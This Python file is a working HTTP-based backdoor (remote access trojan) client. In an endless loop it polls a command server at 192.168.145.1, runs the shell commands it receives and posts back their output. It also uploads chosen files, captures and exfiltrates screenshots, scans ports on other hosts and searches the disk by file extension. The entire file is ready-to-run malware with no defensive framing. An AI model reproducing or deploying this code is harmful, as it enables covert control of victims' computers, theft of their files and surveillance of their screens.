import requests 
import subprocess 
import os
import time
import socket


from PIL import ImageGrab # Used to Grab a screenshot
import tempfile           # Used to Create a temp directory
import shutil             # Used to Remove the temp directory


def main(): 

    req = requests.get('http://192.168.145.1')
    command = req.text
        
    if 'terminate' in command:
        return 'terminate'

    elif 'grab' in command:
        grab,path=command.split(' ')
        if os.path.exists(path):
            url = 'http://192.168.145.1/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
            post_response = requests.post(url='http://192.168.145.1', data='[+] File stored as file.txt' )
        else:
            post_response = requests.post(url='http://192.168.145.1', data='[-] Not able to find the file !' )
            

    elif 'screencap' in command:      #If we got a screencap keyword, then .. 
        
        dirpath = tempfile.mkdtemp()  #Create a temp dir to store our screenshot file

        ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")  #Save the screencap in the temp dir

        url = 'http://192.168.145.1/store'                   
        files = {'file': open(dirpath + "\img.jpg", 'rb')}
        r = requests.post(url, files=files)                 #Transfer the file over our HTTP
        post_response = requests.post(url='http://192.168.145.1', data='[+] Captured image stored as file.txt' )
        
        files['file'].close()   #Once the file gets transfered, close the file.
        shutil.rmtree(dirpath)  #Remove the entire temp dir


    elif 'scan' in command:
        command = command[5:]
        ip,ports = command.split(':')
        scan_result = ''

        for port in ports.split(','):
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            output = sock.connect_ex((ip,int(port)))
            if output ==0:
                scan_result= scan_result + 'Port ' + port + ' is open\n'
            sock.close()

        if scan_result=='':
            scan_result = 'None of the specified ports are open'
        res = requests.post(url='http://192.168.145.1', data=scan_result)

    elif 'search' in command:
        command=command[7:]
        path,ext = command.split('*')
        l = ''
        for dirname,subdirname,filenames in os.walk(path):
            for filename in filenames:
                if filename.endswith(ext):
                    l += dirname + filename + '\n'
        res = requests.post(url = 'http://192.168.145.1',data = l)

    elif command.startswith('cd') and len(command)>3:
        os.chdir(command.split(' ')[1])
        res = requests.post(url = 'http://192.168.145.1',data=os.getcwd())

    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.145.1', data=CMD.stdout.read() )
        post_response = requests.post(url='http://192.168.145.1', data=CMD.stderr.read() )


while True:
    try:
        if main()=='terminate':
            break
    except:
        time.sleep(2)
    



